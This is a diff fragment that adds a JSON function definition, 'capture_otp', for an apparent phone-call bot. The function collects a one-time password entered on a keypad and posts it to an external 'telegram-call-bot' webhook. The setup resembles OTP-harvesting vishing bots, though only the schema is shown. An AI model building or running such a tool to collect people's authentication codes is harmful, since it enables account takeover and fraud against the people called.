@@ -1,0 +1,19 @@
+  "type": "function",
+  "function": {
+    "name": "capture_otp",
+    "description": "Capture OTP entered by user via phone keypad",
+    "parameters": {
+      "type": "object",
+      "properties": {
+        "otp": {
+          "type": "string",
+          "description": "Digits entered by the user"
+        }
+      },
+      "required": ["otp"]
+    }
+  },
+  "server": {
+    "url": "https://telegram-call-bot-izyg.vercel.app/api/webhook"
+  }
+}
